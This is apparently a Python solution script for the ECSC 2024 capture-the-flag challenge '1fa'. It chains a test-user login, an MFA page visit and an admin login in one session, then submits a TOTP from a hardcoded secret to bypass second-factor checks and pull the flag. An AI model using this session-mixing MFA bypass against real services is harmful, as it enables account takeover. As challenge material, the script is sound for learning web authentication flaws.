import requests
import re
import pyotp

s = requests.Session()

res = s.post('https://1fa.ecsc24.hack.cert.pl/login', data={
    'login': 'testtest',
    'password': 'hunter.2',
}, allow_redirects=False)
print(res)
print(res.headers)

res = s.get('https://1fa.ecsc24.hack.cert.pl/mfa')
print(res)
print(res.headers)

res = s.post('https://1fa.ecsc24.hack.cert.pl/login', data={
    'login': 'admin',
    'password': 'RobertR@c!ng#24',
}, allow_redirects=False)

print(res)
print(res.headers)

totp = pyotp.TOTP('77ZKJLAAB74VXBSSKFGHX2AY5CNLHLN7')
res = s.post('https://1fa.ecsc24.hack.cert.pl/mfa', data={
    'mfa_code': totp.now(),
})

print(res)
print(res.headers)
# print(res.text)
print()
print(re.search(r'ecsc24{.*}', res.text)[0])


